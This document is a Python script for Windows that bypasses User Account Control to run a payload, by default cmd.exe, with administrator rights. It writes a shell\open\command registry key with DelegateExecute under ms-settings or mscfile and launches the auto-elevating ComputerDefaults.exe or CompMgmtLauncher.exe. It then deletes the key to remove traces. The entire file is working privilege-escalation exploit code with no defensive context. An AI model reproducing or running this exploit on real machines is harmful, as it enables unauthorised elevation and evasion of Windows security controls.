from winreg import *
import sys, ctypes, subprocess, os, time
HKCU = HKEY_CURRENT_USER

#Parameters
if len(sys.argv) == 2:
    payload = sys.argv[0]
else:
    payload = 'cmd.exe'
    
#If already elevated
if ctypes.windll.shell32.IsUserAnAdmin() == 1:
    os.startfile(payload)
    sys.exit(0)
    
#Get Windows Version
ver = sys.getwindowsversion()
win_ver = '.'.join(map(str,(ver.major, ver.minor)))


#Get UAC Level
key = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
uac = EnumValue(OpenKey(HKEY_LOCAL_MACHINE, key), 0)[1]

def create_key(path, key, value):
    try:
        CreateKey(HKCU, path)
        reg_key = OpenKey(HKCU, path, 0, KEY_WRITE)
        SetValueEx(reg_key, key, 0, REG_SZ, value)
        CloseKey(reg_key)
    except WindowsError:
        raise

def delete_key(path):
    key = path.split("\\")
    for x in range(6,2,-1):
        reg_path = '\\'.join(key[:x])
        DeleteKey(HKCU, reg_path)

def exploit(key, exploit, cmd):
    path = r'Software\Classes\{key}\shell\open\command'.format(key=key)
    create_key(path, None, cmd)
    create_key(path, 'DelegateExecute', None)
    os.startfile(exploit)
    time.sleep(5)
    delete_key(path)

if uac == 2:
    UAC_LEVEL = 'High'
elif uac == 5:
    UAC_LEVEL = 'Default'
elif uac == 0:
    UAC_LEVEL = 'None'
else:
    UAC_LEVEL = 'Unknown'

#EXPLOIT
if UAC_LEVEL == 'High':
    sys.exit()
elif UAC_LEVEL == 'None':
    ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(payload), None, 1)
else:
    if win_ver == '10.0':
        exploit('ms-settings', 'ComputerDefaults.exe', payload)
    else:
        exploit('mscfile', 'CompMgmtLauncher.exe', payload)
